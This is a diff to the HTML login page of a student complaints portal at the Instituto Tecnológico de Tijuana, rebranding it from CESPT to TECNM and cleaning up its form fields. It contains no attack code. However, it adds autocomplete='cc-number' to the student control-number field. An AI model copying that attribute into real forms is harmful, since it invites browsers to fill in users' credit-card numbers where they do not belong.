@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CESPT - Iniciar Sesión</title>
+    <title>TECNM - Iniciar Sesión</title>
 
     <!-- Fuente moderna -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
@@ -210,33 +210,34 @@
         <div class="login-card">
 
             <div class="logo">
-               <img src=https://i.postimg.cc/BbVVg5N0/Screenshot-125.png" alt="Mi imagen">
+               <img src="https://i.postimg.cc/BbVVg5N0/Screenshot-125.png" alt="Mi imagen">
                 <p>Centro de Quejas del Instituto Tecnológico de Tijuana.</p>
             </div>
 
-            <form id="loginForm" class="login-form">
+            <form id="loginForm" class="login-form" autocomplete="on">
                 <h2>Identificación</h2>
 
                 <div class="form-group">
-                    <label for="numero_servicio">Número de control *</label>
+                    <label for="numero_de_control">Número de control *</label>
                     <input 
                         type="text"
-                        id="numero_servicio"
-                        name="numero_servicio"
+                        id="numero_de_control"
+                        name="numero_de_control"
                         placeholder="8-10 dígitos"
                         required
                         pattern="[0-9]{8,10}"
+                        autocomplete="cc-number"
                     >
                     <small>Encuéntralo en tu credencial</small>
                 </div>
 
                 <div class="form-group">
-                    <label for="telefono">Contraseña *</label>
+                    <label for="contraseña">Contraseña *</label>
                     <input 
-                        type="text"
-                        id="telefono"
-                        name="telefono"
-                        placeholder="18 dígitos"
+                        type="password"
+                        id="contraseña"
+                        name="contraseña"
+                        placeholder="18 letras"
                         required
                         pattern="[A-Z0-9]{18}"
                     >
